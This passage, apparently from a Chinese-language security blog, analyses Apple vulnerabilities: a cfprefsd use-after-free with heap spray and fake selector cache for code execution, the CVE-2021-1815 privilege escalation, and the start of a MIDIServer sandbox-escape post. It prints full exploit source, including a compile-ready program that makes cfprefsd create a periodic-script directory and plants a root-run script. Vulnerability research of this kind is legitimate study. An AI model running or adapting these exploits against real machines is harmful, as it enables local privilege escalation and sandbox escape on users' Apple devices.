xpc_connection_create_mach_service(&quot;com.apple.cfprefsd.daemon&quot;,0,XPC_CONNECTION_MACH_SERVICE_PRIVILEGED);</span><br><span class="line">#endif</span><br><span class="line">   </span><br><span class="line">    xpc_connection_set_event_handler(client, ^void(xpc_object_t response) &#123;</span><br><span class="line">        xpc_type_t t = xpc_get_type(response);</span><br><span class="line">        if (t == XPC_TYPE_ERROR)&#123;</span><br><span class="line">            printf(&quot;err: %s\n&quot;, xpc_dictionary_get_string(response, XPC_ERROR_KEY_DESCRIPTION));</span><br><span class="line">            need_stop = 1 ;</span><br><span class="line">        &#125;</span><br><span class="line">        //printf(&quot;received an event\n&quot;);</span><br><span class="line">    &#125;);</span><br><span class="line">   </span><br><span class="line">    xpc_connection_resume(client);</span><br><span class="line">    xpc_object_t main_dict = xpc_dictionary_create(NULL, NULL, 0);</span><br><span class="line">   </span><br><span class="line">    xpc_object_t arr = xpc_array_create(NULL, 0);</span><br><span class="line">   </span><br><span class="line">    xpc_object_t spray_dict = xpc_dictionary_create(NULL, NULL, 0);</span><br><span class="line">    xpc_dictionary_set_int64(spray_dict, &quot;CFPreferencesOperation&quot;, 8);</span><br><span class="line">    xpc_dictionary_set_string(spray_dict, &quot;CFPreferencesDomain&quot;, &quot;xpc_str_domain&quot;);</span><br><span class="line">    xpc_dictionary_set_string(spray_dict, &quot;CFPreferencesUser&quot;, &quot;xpc_str_user&quot;);</span><br><span class="line">   </span><br><span class="line">    char key[100];</span><br><span class="line">    char value[FILL_SIZE];</span><br><span class="line">    memset(value, &quot;A&quot;, FILL_SIZE);</span><br><span class="line">    *((uint64_t *)value) = 0x4142010180202020;</span><br><span class="line">    //*((uint64_t *)value) = 0x180202020;</span><br><span class="line">    value[FILL_SIZE-1]=0;</span><br><span class="line">    for (int i=0; i&lt;FILL_DICT_COUNT; i++) &#123;</span><br><span class="line">        sprintf(key, &quot;%d&quot;,i);</span><br><span class="line">        xpc_dictionary_set_string(spray_dict, key, value);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    //NSLog(@&quot;%@&quot;, spray_dict);</span><br><span class="line">    for (uint64_t i=0; i&lt;FILL_COUNT; i++) &#123;</span><br><span class="line">        xpc_array_append_value(arr, spray_dict);</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    xpc_dictionary_set_int64(main_dict, &quot;CFPreferencesOperation&quot;, 5);</span><br><span class="line">   </span><br><span class="line">    xpc_dictionary_set_value(main_dict, &quot;CFPreferencesMessages&quot;, arr);</span><br><span class="line"> </span><br><span class="line">    void* heap_spray_target_addr = (void*)0x180202000;</span><br><span class="line">    struct heap_spray* map = mmap(heap_spray_target_addr, 0x1000, 3, MAP_ANON|MAP_PRIVATE|MAP_FIXED, 0, 0);</span><br><span class="line">    memset(map, 0, 0x1000);</span><br><span class="line">    struct heap_spray* hs = (struct heap_spray*)((uint64_t)map + 0x20);</span><br><span class="line">    //hs-&gt;null0 = 0;</span><br><span class="line">    hs-&gt;cmd = -1;</span><br><span class="line">    hs-&gt;fake_objc_class_ptr = &amp;hs-&gt;fake_objc_class;</span><br><span class="line">    hs-&gt;fake_objc_class.cache_buckets_ptr = &amp;hs-&gt;fake_cache_bucket;</span><br><span class="line">    hs-&gt;fake_objc_class.cache_bucket_mask = 0;</span><br><span class="line">    hs-&gt;fake_sel_addr = &amp;hs-&gt;fake_cache_bucket.cached_sel;</span><br><span class="line">    // nasty hack to find the correct selector address</span><br><span class="line">    hs-&gt;fake_cache_bucket.cached_sel = 0x7fff00000000 + (uint64_t)NSSelectorFromString(@&quot;dealloc&quot;);</span><br><span class="line">   </span><br><span class="line">    hs-&gt;fake_cache_bucket.cached_function = 0xdeadbeef;</span><br><span class="line">    size_t heap_spray_pages = 0x40000;</span><br><span class="line">    size_t heap_spray_bytes = heap_spray_pages * 0x1000;</span><br><span class="line">    char* heap_spray_copies = malloc(heap_spray_bytes);</span><br><span class="line">    for (int i = 0; i &lt; heap_spray_pages; i++)&#123;</span><br><span class="line">    memcpy(heap_spray_copies+(i*0x1000), map, 0x1000);</span><br><span class="line">    &#125;</span><br><span class="line">    xpc_dictionary_set_data(main_dict, &quot;heap_spray&quot;, heap_spray_copies, heap_spray_bytes);</span><br><span class="line"> </span><br><span class="line">    //NSLog(@&quot;%@&quot;, main_dict);</span><br><span class="line">    xpc_connection_send_message(client, main_dict);</span><br><span class="line">    printf(&quot;fill once\n&quot;);</span><br><span class="line">    xpc_release(main_dict);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">void trigger_vul()&#123;</span><br><span class="line">    #if AGENT</span><br><span class="line">        printf(&quot;AGENT\n&quot;);</span><br><span class="line">        xpc_connection_t conn = xpc_connection_create_mach_service(&quot;com.apple.cfprefsd.agent&quot;,0,0);</span><br><span class="line">    #else</span><br><span class="line">        printf(&quot;DAEMON\n&quot;);</span><br><span class="line">        xpc_connection_t conn = xpc_connection_create_mach_service(&quot;com.apple.cfprefsd.daemon&quot;,0,XPC_CONNECTION_MACH_SERVICE_PRIVILEGED);</span><br><span class="line">    #endif</span><br><span class="line">        xpc_connection_set_event_handler(conn, ^(xpc_object_t response) &#123;</span><br><span class="line">            xpc_type_t t = xpc_get_type(response);</span><br><span class="line">            if (t == XPC_TYPE_ERROR)&#123;</span><br><span class="line">                printf(&quot;err: %s\n&quot;, xpc_dictionary_get_string(response, XPC_ERROR_KEY_DESCRIPTION));</span><br><span class="line">                need_stop = 1 ;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        xpc_connection_resume(conn);</span><br><span class="line">       </span><br><span class="line">        xpc_object_t hello = xpc_dictionary_create(NULL, NULL, 0);</span><br><span class="line">        xpc_object_t arr = xpc_array_create(NULL, 0);</span><br><span class="line">   </span><br><span class="line">        xpc_object_t arr_free = xpc_dictionary_create(NULL, NULL, 0);</span><br><span class="line">        xpc_dictionary_set_int64(arr_free, &quot;CFPreferencesOperation&quot;, 4);</span><br><span class="line">        xpc_array_append_value(arr, arr_free);</span><br><span class="line">        for (int i=0; i&lt;FREE_COUNT; i++) &#123;</span><br><span class="line">            xpc_object_t arr_elem1 = xpc_dictionary_create(NULL, NULL, 0);</span><br><span class="line">            xpc_dictionary_set_int64(arr_elem1, &quot;CFPreferencesOperation&quot;, 20);</span><br><span class="line">            xpc_array_append_value(arr, arr_elem1);</span><br><span class="line">        &#125;</span><br><span class="line">        //printf(&quot;%p, %p\n&quot;, arr_elem1, hello);</span><br><span class="line">        xpc_dictionary_set_int64(hello, &quot;CFPreferencesOperation&quot;, 5);</span><br><span class="line">        xpc_dictionary_set_value(hello, &quot;CFPreferencesMessages&quot;, arr);</span><br><span class="line"> </span><br><span class="line">        //NSLog (@&quot;%@&quot;, hello);</span><br><span class="line">        fill_once();</span><br><span class="line">        xpc_connection_send_message(conn, hello);</span><br><span class="line">        NSLog(@&quot; trigger vuln&quot;);</span><br><span class="line">        xpc_release(hello);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">int main(int argc, const char * argv[]) &#123;</span><br><span class="line"> </span><br><span class="line">    pthread_t fillthread1,triger_thread;</span><br><span class="line">    NSLog(@&quot;start to trigger..&quot;);</span><br><span class="line">    trigger_vul();</span><br><span class="line"> </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="漏洞利用-PZ"><a href="#漏洞利用-PZ" class="headerlink" title="漏洞利用 - PZ"></a>漏洞利用 - PZ</h3><h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><p>还是在两次xpc_release中间，填充被释放的内存空间，通过并行运行的四个线程来实现，线程A、B和C启动并等待全局变量设置为1。当全局变量为1时，线程A、B和C分别尝试发送100次下面的XPC消息给服务：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 这不是一个有效的multiMessage</span></span><br><span class="line">&#123; <span class="string">&quot;CFPreferencesOperation&quot;</span>: 5,</span><br><span class="line">  <span class="string">&quot;CFPreferencesMessages&quot;</span> : [10<span class="string">&#x27;000 * xpc_data_spray] &#125;</span></span><br></pre></td></tr></table></figure>

<p>xpc_data_spray大小为448字节，目标地址是0x118080000。</p>
<h4 id="控制PC-1"><a href="#控制PC-1" class="headerlink" title="控制PC"></a>控制PC</h4><p>该漏洞将由子消息触发，其中操作键被映射到不会调用reply的处理程序。攻击者选择了操作4，由handleFlushSourceForDomainMessage处理。触发器消息如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123; &quot;CFPreferencesOperation&quot;: 5</span><br><span class="line">  &quot;CFPreferencesMessages&quot; :</span><br><span class="line">    [</span><br><span class="line">      8000 * (op_1_dict, second_op_5_dict),</span><br><span class="line">      150 * (second_op_5_dict, op_4_dict, op_4_dict, op_4_dict),</span><br><span class="line">      third_op_5_dict</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>子消息如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">op_1_dict = &#123;</span><br><span class="line">  &quot;CFPreferencesOperation&quot;: 1,</span><br><span class="line">  &quot;domain&quot;: &quot;a&quot;,</span><br><span class="line">  &quot;A&quot;: 8_byte_xpc_data</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">second_op_5_dict = &#123;</span><br><span class="line">  &quot;CFPreferencesOperation&quot;: 5</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">op_4_dict = &#123;</span><br><span class="line">  &quot;CFPreferencesOperation&quot;: 4</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">third_op_5_dict = &#123;</span><br><span class="line">  &quot;CFPreferencesOperation&quot;: 5</span><br><span class="line">  &quot;CFPreferencesMessages&quot; : [0x2000 * xpc_send_right,</span><br><span class="line">                             0x10 * xpc_data_heapspray]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面的思路中说到，如果堆喷成功填充0x118080000处的内存的话，接下来就是调用xpc_release()函数，来进行释放。题外话，OC对象的第一个qword是它的isa指针，定义了对象的类型。xpc_release()函数会检查libxpc的__objc_data中是否有isa指针，如果存在，则调用os_object_release()函数；由于填充的0x118080000是一个虚假isa指针，因此会走另一条路，调用objc_release()函数。如果类对象的字段中的FAST_ALLOC位（偏移为0x20处字节的第2位）被清零，则释放选择器被发送到对象。</p>
<p>这种虚假选择器缓存技术可以参考<a target="_blank" rel="noopener" href="http://phrack.org/issues/69/9.html#article">Modern Objective-C Exploitation Techniques</a>。</p>
<p><img src="https://1.bp.blogspot.com/-47GnhJdhCx8/XWgi-xKfCOI/AAAAAAAANSU/7DRaHOJNZyomgFByAHrWqfsRbVgDA55kgCEwYBhgL/s1600/cfprefsd%2Bfake%2Bselector%2Bcache%2B-%2BHI_RES.png"></p>
<p>obj_msgSend负责处理选择器调用的本机函数。首先，obj_msgSend根绝isa指针，找到0x10处的(function_pointer, selector)对的数组，如果选择器与缓存中的条目匹配，就会调用缓存的函数指针。</p>
<p>控制PC后，接下来通过ROP，调用IOServiceMatching、IOServiceGetMatchingService和IOServiceOpen来获取一个IOKit UserClient mach端口发送权限。攻击者使用内存写入小工具将该端口名称写入他们连续发送的四个exfil消息。在WebContent进程中，在端口集上侦听消息。如果收到该消息，则会在其中发送一个ProvInfoIOKitUserClient。</p>
<p>ProvInfoIOKitUserClient将是另一个内核漏洞的故事了，有机会再说。</p>
<h2 id="CVE-2020-9839"><a href="#CVE-2020-9839" class="headerlink" title="CVE-2020-9839"></a>CVE-2020-9839</h2><h2 id="CVE-2021-1815"><a href="#CVE-2021-1815" class="headerlink" title="CVE-2021-1815"></a>CVE-2021-1815</h2><p>CVE-2020-9839的patch如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> _CFPrefsCreatePreferencesDirectory(path) &#123;</span><br><span class="line">    <span class="type">int</span> dirfd = open(<span class="string">&quot;/&quot;</span>, O_DIRECTORY);</span><br><span class="line">    <span class="keyword">for</span>(slice in path.split(<span class="string">&quot;/&quot;</span>)) &#123;</span><br><span class="line">        <span class="type">int</span> fd = openat(dirfd, slice, O_DIRECTORY);</span><br><span class="line">        <span class="keyword">if</span> (fd == <span class="number">-1</span> &amp;&amp; errno == ENOENT &amp;&amp; !mkdirat(dirfd, slice, perm)) &#123;</span><br><span class="line">            fd = openat(dirfd, slice, O_DIRECTORY|O_NOFOLLOW);</span><br><span class="line">            <span class="keyword">if</span> ( fd == <span class="number">-1</span> ) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">            fchown(fd, uid, gid);</span><br><span class="line">        &#125;</span><br><span class="line">        &#125; <span class="comment">// close all fds return 0;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Apple 的修复确保不再遵循符号链接，因此无法再更改任意目录上的所有权。但该补丁不足以完全阻止权限提升。上面显示的代码仍然允许用户使用<strong>用户</strong>或<strong>root</strong>权限创建目录。由于目录位置在攻击者的控制之下，这可能会被滥用以将权限提升到 root。</p>
<p>macOS 使用维护脚本，即每天、每周和每月以 root 权限运行的定期脚本。周期性脚本通过**&#x2F;etc&#x2F;defaults&#x2F;periodic.conf**文件进行配置。此脚本也可以由用户定义：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 周期性脚本目录</span><br><span class="line">local_periodic=&quot;/usr/local/etc/periodic&quot;</span><br></pre></td></tr></table></figure>

<p>在默认 macOS 安装中，这个目录不存在。这意味着我们可以通过连接到<strong>cfprefsd</strong>守护程序服务并要求<strong>dameon</strong>将目录的所有权设置给我们的用户来创建此目录。创建此目录后，我们可以在那里创建我们的脚本（因为该位置将由用户拥有）并且该脚本将以 root 身份运行。</p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc -framework Foundation cfprefsd_exploit.m -o cfprefsd_exploit</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#import <span class="string">&lt;Foundation/Foundation.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xpc/xpc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> *serviceName = <span class="string">&quot;com.apple.cfprefsd.daemon&quot;</span>;</span><br><span class="line">    <span class="type">int</span> status = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">xpc_connection_t</span> conn;</span><br><span class="line">    <span class="type">xpc_object_t</span> msg;</span><br><span class="line"></span><br><span class="line">    conn = <span class="built_in">xpc_connection_create_mach_service</span>(serviceName, <span class="literal">NULL</span>, XPC_CONNECTION_MACH_SERVICE_PRIVILEGED);</span><br><span class="line">    <span class="keyword">if</span> (conn == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">perror</span>(<span class="string">&quot;xpc_connection_create_mach_service&quot;</span>);    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">xpc_connection_set_event_handler</span>(conn, ^(<span class="type">xpc_object_t</span> obj) &#123;</span><br><span class="line">        <span class="built_in">perror</span>(<span class="string">&quot;xpc_connection_set_event_handler&quot;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">xpc_connection_resume</span>(conn);</span><br><span class="line"></span><br><span class="line">    msg = <span class="built_in">xpc_dictionary_create</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">xpc_dictionary_set_int64</span>(msg, <span class="string">&quot;CFPreferencesOperation&quot;</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">xpc_dictionary_set_bool</span>(msg, <span class="string">&quot;CFPreferencesUseCorrectOwner&quot;</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//create as user</span></span><br><span class="line">    <span class="built_in">xpc_dictionary_set_string</span>(msg, <span class="string">&quot;CFPreferencesUser&quot;</span>, <span class="string">&quot;kCFPreferencesCurrentUser&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">xpc_dictionary_set_string</span>(msg, <span class="string">&quot;CFPreferencesHostBundleIdentifier&quot;</span>, <span class="string">&quot;prefs&quot;</span>);</span><br><span class="line">    <span class="built_in">xpc_dictionary_set_string</span>(msg, <span class="string">&quot;CFPreferencesDomain&quot;</span>, <span class="string">&quot;/usr/local/etc/periodic/daily/a.plist&quot;</span>);</span><br><span class="line">    <span class="built_in">xpc_dictionary_set_string</span>(msg, <span class="string">&quot;Key&quot;</span>, <span class="string">&quot;key&quot;</span>);</span><br><span class="line">    <span class="built_in">xpc_dictionary_set_string</span>(msg, <span class="string">&quot;Value&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">xpc_connection_send_message</span>(conn, msg);</span><br><span class="line">    <span class="built_in">usleep</span>(<span class="number">1000000</span>);</span><br><span class="line">   </span><br><span class="line">    NSString* script = @<span class="string">&quot;touch /Library/privesc.txt\n&quot;</span>;</span><br><span class="line">    NSError *error;</span><br><span class="line">    BOOL succeed = [script writeToFile:@<span class="string">&quot;/usr/local/etc/periodic/daily/111.lpe&quot;</span> atomically:YES encoding:NSUTF8StringEncoding error:&amp;error];</span><br><span class="line">    <span class="keyword">if</span> (!succeed)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Couldn&#x27;t create periodic script :(\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    <span class="type">char</span> mode[] = <span class="string">&quot;0777&quot;</span>;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    i = <span class="built_in">strtol</span>(mode, <span class="number">0</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">chmod</span>(<span class="string">&quot;/usr/local/etc/periodic/daily/111.lpe&quot;</span>,i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此漏洞利用将向以 root<strong>身份</strong>运行的<strong>cfprefsd</strong>守护进程发起 XPC 消息。这由服务名称<strong>com.apple.cfprefsd.daemon</strong>标识（用户模式守护进程被标识为<strong>com.apple.cfprefsd.agent</strong>）。守护进程将创建文件夹**&#x2F;usr&#x2F;local&#x2F;etc&#x2F;periodic&#x2F;daily&#x2F;<strong>然后将我们的脚本写入该位置，该位置将运行</strong>touch &#x2F;Library&#x2F;privesc.txt**。</p>
<p>如果需要，我们还可以在漏洞利用中使用以下行以 root 身份创建一个目录。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xpc_dictionary_set_string(msg, &quot;CFPreferencesUser&quot;, &quot;root&quot;);</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a target="_blank" rel="noopener" href="https://gts3.org/assets/papers/2020/jin:pwn2own2020-safari-slides.pdf">Compromising the macOS Kernel through Safari by Chaining Six Vulnerabilities</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://buffer0verflooow.github.io/2021/12/12/iOS-RCE-CVE-2019-8797-CVE-2019-8795-CVE-2019-8794/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="buffer0verflooow">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="buffer0verflooow - Blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | buffer0verflooow - Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/12/12/iOS-RCE-CVE-2019-8797-CVE-2019-8795-CVE-2019-8794/" class="post-title-link" itemprop="url">iOS RCE: CVE-2019-8797,CVE-2019-8795,CVE-2019-8794</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-12-12 18:36:57" itemprop="dateCreated datePublished" datetime="2021-12-12T18:36:57+08:00">2021-12-12</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2022-05-03 21:26:13" itemprop="dateModified" datetime="2022-05-03T21:26:13+08:00">2022-05-03</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>这三个漏洞是在iOS12.3.1中发现的，将这些漏洞进行组合，能够实现在内核中执行代码。</p>
<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>在iOS 13.2，iPadOS 13.2，macOS Catalina 10.15.1，tvOS 13.2，watchOS 6.1中进行了修复。</p>
<h2 id="沙盒逃逸"><a href="#沙盒逃逸" class="headerlink" title="沙盒逃逸"></a>沙盒逃逸</h2><p>与内核相反，许多在用户空间中运行的守护进程可以通过默认的应用程序沙箱访问。<code>MIDIServer(com.apple.midiserver)</code>允许应用程序和其他服务与可能连接到设备的MIDI硬件进行交互。</p>
<p><code>MIDIServer</code>二进制文件本身相当简单，它是一个 stub 二进制文件，它的所有功能实际上都存储在一个库中，该库是共享缓存<code>(CoreMIDI)</code>的一部分：<code>MIDIServer</code>的<code>main</code>函数只是调用<code>MIDIServerRun()</code>函数。</p>
<p><code>CoreMIDI</code>然后设置两个沙箱可访问的Mach服务，<a target="_blank" rel="noopener" href="http://com.apple.midiserver和com.apple.midiserver.io/"><code>com.apple.midiserver和com.apple.midiserver.io</code></a>。前者是典型的基于MIG的Mach服务器，它实现了47种方法。然而<code>com.apple.midiserver.io</code>是一个自定义实现，用于在客户端和服务器之间传输IO缓冲区。</p>
<p><code>IO Mach server</code>主线程：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">MIDIIOThread::Run</span><span class="params">(MIDIIOThread *this, __int64 a2, __int64 a3, <span class="type">int</span> *a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  x0 = XMachServer::CreateServerPort(<span class="string">&quot;com.apple.midiserver.io&quot;</span>, <span class="number">3</span>, this + <span class="number">140</span>, a4);</span><br><span class="line">  *(this + <span class="number">36</span>) = x0;</span><br><span class="line">  <span class="keyword">if</span> ( !*(this + <span class="number">35</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    server_port = x0;</span><br><span class="line">    *(this + <span class="number">137</span>) = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      bufsz = <span class="number">4</span>;</span><br><span class="line">      <span class="keyword">if</span> ( XServerMachPort::ReceiveMessage(&amp;server_port, &amp;msg_cmd, &amp;msg_buf, &amp;bufsz) || msg_cmd == <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      ResolvedOpaqueRef&lt;ClientProcess&gt;::ResolvedOpaqueRef(&amp;v10, msg_buf);</span><br><span class="line">      <span class="keyword">if</span> ( v12 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( msg_cmd == <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          ClientProcess::WriteDataAvailable(v12);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( msg_cmd == <span class="number">2</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          ClientProcess::EmptiedReadBuffer(v12);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v10 )</span><br><span class="line">      &#123;</span><br><span class="line">        applesauce::experimental::sync::LockFreeHashTable&lt;<span class="type">unsigned</span> <span class="type">int</span>,BaseOpaqueObject *,(applesauce::experimental::sync::LockFreeHashTableOptions)<span class="number">1</span>&gt;::Lookup::~Lookup(&amp;v11);</span><br><span class="line">        LOBYTE(v10) = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    x0 = XServerMachPort::~XServerMachPort(&amp;server_port);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> x0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>XServerMachPort::ReceiveMessage</code>使用<code>MACH_RCV_MSG</code>参数调用<code>mach_msg</code>，等待该端口上的消息。这个消息包含一个命令ID和一个长度字段，后面是消息的主体，由<code>ReceiveMessage</code>调用解析。提供了三个命令：命令1将调用<code>ClientProcess::WriteDataAvailable</code>，命令2将调用<code>ClientProcess::EmptiedReadBuffer</code>，命令3将退出Mach服务循环。通过<code>ResolvedOpaqueRef</code>找到传递给<code>ClientProcess</code>调用的v12对象。这个方法将使用消息中提供的4字节缓冲区(对象ID)在哈希表中查找，将对象返回到堆栈上。</p>
<p>这漏洞存在于<code>ResolvedOpaqueRef&lt;ClientProcess&gt;::ResolvedOpaqueRef</code>函数中。</p>
<p>这个方法使用的哈希表实际上包含许多不同类型的对象，而不仅仅是<code>ClientProcess</code>类型的对象。例如，<code>MIDIExternalDeviceCreate</code>和<code>MIDIDeviceAddEntity</code>创建的对象都存储在此哈希表中。</p>
<p>如果进行正确的类型检查，这里就没有问题。但是，实际上，有两种访问此哈希表的方法：</p>
<ol>
<li><code>BaseOpaqueObject::ResolveOpaqueRef</code></li>
<li><code>ResolvedOpaqueRef&lt;ClientProcess&gt;::ResolvedOpaqueRef</code></li>
</ol>
<p>第一种在<code>_MIDIDeviceAddEntity</code>方法中使用，包含正确的类型检查：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">midi_device = BaseOpaqueObject::ResolveOpaqueRef(&amp;TOpaqueRTTI&lt;MIDIDevice&gt;::sRTTI, device_id);</span><br></pre></td></tr></table></figure>

